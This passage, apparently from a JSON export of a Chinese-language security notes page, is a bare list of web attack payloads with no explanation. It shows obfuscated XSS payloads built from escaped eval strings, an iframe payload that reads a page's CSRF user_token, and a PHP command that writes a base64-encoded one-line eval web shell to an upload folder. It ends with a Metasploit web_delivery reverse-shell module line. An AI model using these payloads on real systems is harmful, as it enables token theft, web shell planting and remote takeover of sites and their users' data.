123&lt;script&gt;eval(&apos;\\x76\\x61\\x72\\40\\141\\75String.fromCharCode(%34%39);\\u0061\\u006c\\u0065\\u0072\\u0074\\u0028a\\u0029;&apos;)&lt;/script&gt; 123&lt;script&gt;eval(&apos;\\x76\\x61\\x72\\40\\141\\75%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%34%39%29%3b\\u0061\\u006c\\u0065\\u0072\\u0074\\u0028a\\u0029;&apos;)&lt;/script&gt; 获取usertoken 1&lt;iframe src=&quot;../csrf&quot;onload=alert(frames[0].document.getElementsByName(&apos;user_token&apos;)[0].value)&gt; PHP伪协议写一句话 1&lt;?php echo `echo PD9waHAgQGV2YWwoJF9QT1NUWydhJ10pPz4=|base64 -d &gt; upload/1.php` ;?&gt; MSF反弹shell 1use exploit/multi/script/web_delivery","categories":[],"tags":[]}]}